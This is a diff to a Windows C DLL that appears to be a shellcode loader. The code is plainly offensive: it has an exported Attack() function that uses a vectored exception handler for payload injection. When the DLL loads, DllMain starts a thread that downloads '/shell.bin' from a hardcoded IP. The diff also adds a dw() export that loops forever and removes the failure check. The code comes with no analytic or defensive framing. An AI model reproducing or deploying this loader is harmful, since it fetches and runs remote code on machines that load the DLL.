@@ -6,10 +6,14 @@ PWSTR url = L"192.168.231.133";
 PWSTR endpoint = L"/shell.bin";
 SIZE_T sSize = -1;
 
+extern __declspec(dllexport) int dw() {
+    while (TRUE) {}
+}
+
 extern __declspec(dllexport) int Attack()
 {
-    PVOID		pVehHandler			= NULL;
-    PVOID       pInjectedPayload	= NULL;
+    PVOID        pVehHandler            = NULL;
+    PVOID       pInjectedPayload    = NULL;
 
     if (!pPayload || !sSize)
         return -1;
@@ -41,8 +45,10 @@ extern __declspec(dllexport) int Attack()
     return 0;
 }
 
+
 EXTERN_C DWORD fetch_payload()
 {
+    //MessageBoxA(NULL, "Hello", "Hello", MB_OK);
     sSize = Download(&pPayload, url, endpoint, FALSE);
     return sSize;
 }
@@ -53,14 +59,9 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved)
     {
         case DLL_PROCESS_ATTACH: {
             //sSize = Download(&pPayload, url, endpoint, FALSE);
-            //WaitForSingleObject(CreateThread(NULL, 0, fetch_payload, NULL,0,NULL ), INFINITE);
-            //fetch_payload();
             CreateThread(NULL, (SIZE_T) NULL, fetch_payload, NULL, (DWORD) NULL, NULL );
-            if (sSize == -1)
-            {
-                printf("[!] Failed to fetch payload from server!\n");
-                return FALSE;
-            }
+            //WaitForSingleObject(CreateThread(NULL, NULL, fetch_payload, NULL, NULL, NULL ), INFINITE);
+            //fetch_payload();
             break;
         }
         case DLL_THREAD_ATTACH:
